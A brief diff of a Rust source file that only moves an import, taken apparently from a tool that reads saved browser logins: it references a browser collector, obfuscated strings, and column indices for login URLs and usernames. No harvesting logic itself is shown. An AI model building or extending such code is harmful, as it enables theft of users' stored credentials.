@@ -4,11 +4,11 @@ use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::FileSystem;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
-use utils::path::Path;
 
 const LOGINS_ORIGIN_URL: usize = 0;
 const LOGINS_USERNAME_VALUE: usize = 3;
